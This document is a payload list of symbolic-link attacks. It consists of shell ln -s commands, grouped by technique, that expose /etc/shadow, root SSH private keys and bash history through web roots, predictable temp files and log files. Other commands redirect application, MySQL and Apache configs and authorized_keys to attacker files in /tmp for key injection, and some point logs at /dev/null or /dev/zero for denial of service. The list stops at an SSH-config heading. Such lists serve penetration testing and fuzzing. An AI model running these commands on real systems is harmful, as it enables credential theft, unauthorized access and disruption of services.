# Symbolic Link Attack Payloads

# ============================================
# 1. BASIC SYMLINK CREATION
# ============================================

# Create symlink to sensitive files
ln -s /etc/passwd passwd_link.txt
ln -s /etc/shadow shadow_link.txt
ln -s /etc/hosts hosts_link.txt
ln -s /root/.ssh/id_rsa root_key_link
ln -s /home/user/.ssh/authorized_keys auth_keys_link

# Symlink to directories
ln -s /etc/ etc_link
ln -s /root/ root_link
ln -s / rootfs_link
ln -s /var/log/ logs_link

# ============================================
# 2. TEMPORARY FILE SYMLINK ATTACKS
# ============================================

# Predict and create temp file symlinks
ln -s /etc/passwd /tmp/app_12345.tmp
ln -s /etc/shadow /tmp/temp_file_$$.tmp
ln -s /root/.ssh/id_rsa /tmp/upload_temp.txt
ln -s /etc/crontab /var/tmp/app_session

# Common temp file patterns
ln -s /etc/passwd /tmp/php_upload_12345
ln -s /etc/passwd /tmp/mysql.sock
ln -s /etc/passwd /var/tmp/sess_abcd1234

# ============================================
# 3. LOG FILE SYMLINK ATTACKS
# ============================================

# Replace log files with symlinks
ln -s /etc/passwd /var/log/app.log
ln -s /etc/shadow /var/log/error.log
ln -s /home/user/.ssh/authorized_keys /var/log/access.log
ln -s /etc/crontab /var/log/system.log

# Symlink to /dev/null for DoS
ln -s /dev/null /var/log/app.log

# Symlink to /dev/zero for infinite data
ln -s /dev/zero /var/log/app.log

# ============================================
# 4. WEB ROOT SYMLINK ATTACKS
# ============================================

# Create symlinks in web directories
ln -s /etc/passwd /var/www/html/passwd.txt
ln -s /etc/shadow /var/www/html/shadow.txt
ln -s /root/.ssh/id_rsa /var/www/html/key.txt
ln -s /home/user/.bash_history /var/www/html/history.txt
ln -s /var/log/apache2/access.log /var/www/html/access.txt

# Symlink to entire directories
ln -s /etc/ /var/www/html/etc
ln -s /root/ /var/www/html/root
ln -s /home/ /var/www/html/home

# PHP uploads directory
ln -s /etc/passwd /var/www/html/uploads/passwd.txt
ln -s /etc/passwd /var/www/html/files/config.txt

# ============================================
# 5. CONFIGURATION FILE SYMLINK
# ============================================

# Replace config files
ln -s /tmp/attacker_config /etc/app/app.conf
ln -s /tmp/evil.ini /etc/app/database.ini
ln -s /tmp/settings.xml /etc/app/settings.xml

# MySQL config
ln -s /tmp/evil.cnf /etc/mysql/my.cnf

# Apache config
ln -s /tmp/evil.conf /etc/apache2/sites-enabled/000-default.conf

# ============================================
# 6. SSH KEY INJECTION SYMLINKS
# ============================================

# Symlink authorized_keys
ln -s /tmp/attacker_keys /home/victim/.ssh/authorized_keys
ln -s /tmp/attacker_keys /root/.ssh/authorized_keys

# Symlink SSH config
